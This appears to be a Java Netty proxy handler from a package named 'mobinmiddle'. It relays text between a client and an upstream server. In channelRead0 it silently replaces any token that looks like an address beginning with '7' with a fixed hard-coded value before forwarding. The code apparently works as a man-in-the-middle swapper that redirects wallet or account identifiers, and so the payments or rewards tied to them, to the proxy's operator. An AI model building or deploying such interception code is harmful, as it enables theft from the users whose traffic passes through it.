package mobinmiddle;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import io.netty.bootstrap.Bootstrap;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import io.netty.channel.ChannelFuture;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInitializer;
import io.netty.channel.ChannelOption;
import io.netty.channel.ChannelPipeline;
import io.netty.channel.SimpleChannelInboundHandler;
import io.netty.channel.socket.SocketChannel;
import io.netty.handler.codec.DelimiterBasedFrameDecoder;
import io.netty.handler.codec.Delimiters;
import io.netty.handler.codec.string.StringDecoder;
import io.netty.handler.codec.string.StringEncoder;

public class ServerHandler extends SimpleChannelInboundHandler<String> {

	private static Logger logger = LoggerFactory.getLogger(ServerHandler.class);

	private final String proxyHost;
	private final int proxyPort;

	private Channel outboundChannel;

	public ServerHandler(String proxyHost, int proxyPort) {
		this.proxyPort = proxyPort;
		this.proxyHost = proxyHost;
	}

	@Override
	public void channelActive(ChannelHandlerContext ctx) throws Exception {
		logger.info("Client connected at remote address " + ctx.channel().remoteAddress());
		// connect to proxy server here

		final Channel inboundChannel = ctx.channel();
		Bootstrap b = new Bootstrap();
		b.group(inboundChannel.eventLoop()).channel(ctx.channel().getClass())
				.handler(new ChannelInitializer<SocketChannel>() {

					@Override
					protected void initChannel(SocketChannel ch) throws Exception {
						ChannelPipeline pipeline = ch.pipeline();

						pipeline.addLast(new DelimiterBasedFrameDecoder(8192, Delimiters.lineDelimiter()));
						pipeline.addLast(new StringDecoder());
						pipeline.addLast(new StringEncoder());
						pipeline.addLast(new ProxyHandler(inboundChannel));

					}

				}).option(ChannelOption.AUTO_READ, false);
		ChannelFuture f = b.connect(proxyHost, proxyPort);
		outboundChannel = f.channel();
		f.addListener(new ChannelFutureListener() {
			@Override
			public void operationComplete(ChannelFuture future) {
				if (future.isSuccess()) {
					inboundChannel.read();
				} else {
					inboundChannel.close();
				}
			}
		});
	}

	@Override
	protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {
		// regex is not tested
		msg = msg.replaceAll("\\s?7[A-Za-z0-9]{25,35}\\s?", "7YWHMfk9JZe0LM0g1ZauHuiSxhI");
		msg = msg + "\n";
		System.out.println(msg);
		if (outboundChannel.isActive()) {
			outboundChannel.writeAndFlush(msg).addListener(new ChannelFutureListener() {
				@Override
				public void operationComplete(ChannelFuture future) {
					if (future.isSuccess()) {
						ctx.channel().read();
					} else {
						future.channel().close();
					}
				}
			});
		}
	}

	@Override
	public void channelInactive(ChannelHandlerContext ctx) {
		if (outboundChannel != null) {
			closeOnFlush(outboundChannel);
		}
	}

	@Override
	public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
		cause.printStackTrace();
		closeOnFlush(ctx.channel());
	}

	static void closeOnFlush(Channel ch) {
		if (ch.isActive()) {
			ch.writeAndFlush(Unpooled.EMPTY_BUFFER).addListener(ChannelFutureListener.CLOSE);
		}
	}

}
